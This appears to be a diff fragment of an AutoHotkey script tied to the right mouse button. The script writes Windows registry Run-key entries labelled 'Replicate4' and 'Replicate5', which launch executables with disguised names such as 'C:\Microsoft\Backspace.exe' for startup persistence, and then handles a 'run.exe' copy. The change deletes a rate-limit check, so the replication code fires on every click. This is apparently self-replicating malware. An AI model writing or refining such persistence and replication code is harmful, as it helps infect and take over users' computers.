@@ -13,13 +13,6 @@ $RButton::{
     RegWrite '"C:\Microsoft\Backspace.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate4"
     RegWrite '"C:\Microsoft\Space.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate5"
 
-    static lastRun := 0
-    delay := 1000
-    now := A_TickCount
-    if (now - lastRun < delay) {
-        return
-    }
-
     output := path "\run.exe"
     if (DirExist(path)) {
         if (FileExist(path "\run.exe")) {
